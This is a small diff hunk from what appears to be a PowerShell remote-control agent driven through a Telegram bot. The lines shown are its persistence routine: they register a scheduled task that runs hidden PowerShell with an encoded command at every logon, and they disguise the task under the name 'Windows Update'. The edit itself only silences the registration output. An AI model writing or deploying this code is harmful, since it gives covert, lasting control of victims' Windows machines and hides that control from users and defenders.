@@ -191,7 +191,7 @@ $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agen
 $accion = New-ScheduledTaskAction -Execute "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-win hidden -enc $code"
 $desencadenante = New-ScheduledTaskTrigger -AtLogOn
 $tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet)
-$tarea | Register-ScheduledTask -TaskName "Windows Update"; $texto = ""
+$tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
